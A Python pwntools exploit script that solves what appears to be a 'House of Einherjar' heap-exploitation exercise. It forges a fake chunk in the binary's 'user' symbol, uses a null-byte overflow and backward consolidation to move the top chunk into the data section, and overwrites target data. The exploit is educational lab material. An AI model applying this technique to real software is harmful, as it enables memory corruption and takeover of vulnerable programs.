#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_einherjar', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main
b *main+199

b *main+358

b *main+433
b *main+466

b *main+610
b *main+672

b *main+755
b *main+861
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def send_name(name):
    io.sendafter(b'Enter your username: ', name)
    
def handle():
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    io.recvuntil(b'> ')
    success('heap @ ' + hex(heap))
    return heap

index = 0
def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1

def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')    

def edit(index, data):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    
def target():
    io.send(b'4')
    io.recvuntil(b'> ')

def quit():
    io.send(b'5')
    
name = p64(0) + p64(8) + p64(elf.sym['user']) + p64(elf.sym['user'])

io = start()
send_name(name)
heap = handle()

# Request 2 chunks.
overflow = malloc(0x88)
victim = malloc(0xf8) # Free this chunk later to trigger backward consolidation with the fake chunk.

# Single null-byte overflow from the "overflow" chunk into the LSB of the "victim" chunk's size field.
# This clears the "victim" chunk's prev_inuse bit.
# Set the "victim" chunk's prev_size field to the delta between the "victim" chunk and the fake chunk.
prev_size = (heap + 0x90) - elf.sym.user
edit(overflow, b'Y'*0x80 + pack(prev_size))

# Free the "victim" chunk to trigger backward consolidation with the fake chunk.
# Forward consolidation merges the fake chunk with the top chunk.
free(victim)

# If unable to merge with the top chunk, a 2nd edit of the fake chunk's size field is required at this point
# to satisfy the unsortedbin size sanity check (not possible with this pwnable).

# The top chunk now resides in the program's data section.
# Request a chunk from it and overwrite the target data.
data_section = malloc(0x88)
edit(data_section, p64(0)*2 + b"Much win!")

# Confirm the target data was overwritten.
io.sendthen(b"target: ", b"4")
target_data = io.recvuntil(b"\n", True)
assert target_data == b"Much win!"
quit()

# =============================================================================

io.interactive()
